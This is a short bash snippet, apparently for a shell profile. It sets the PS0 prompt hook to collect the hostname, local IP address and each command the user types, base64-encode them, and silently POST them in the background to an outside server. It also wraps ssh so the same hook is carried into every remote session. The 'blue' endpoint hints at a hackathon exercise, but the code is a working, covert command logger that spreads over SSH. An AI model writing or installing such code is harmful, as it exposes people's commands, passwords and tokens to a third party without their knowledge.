export PS0='$(__cmd () { hostname | tr -d "\n"; printf "@"; ip -o route get to 8.8.8.8 | sed -n "s/.*src \([0-9.]\+\).*/\1/p" | tr -d "\n"; printf ": "; fc -lnr | head -1 | xargs; }; curl -sL https://hackhpi.kyudev.xyz/api/blue -X POST -H "Content-Type: application/json" -d "{\"data\": \"$(__cmd | base64 -w0)\", \"timestamp\": \"$(date +%s)\"}" >/dev/null & unset -f __cmd)'

ssh () {
  if [ -n "${@}" ]; then
    $(type -P ssh) -t "${@}" "export PS0='${PS0}'; bash"
  else
    $(type -P ssh)
  fi
}
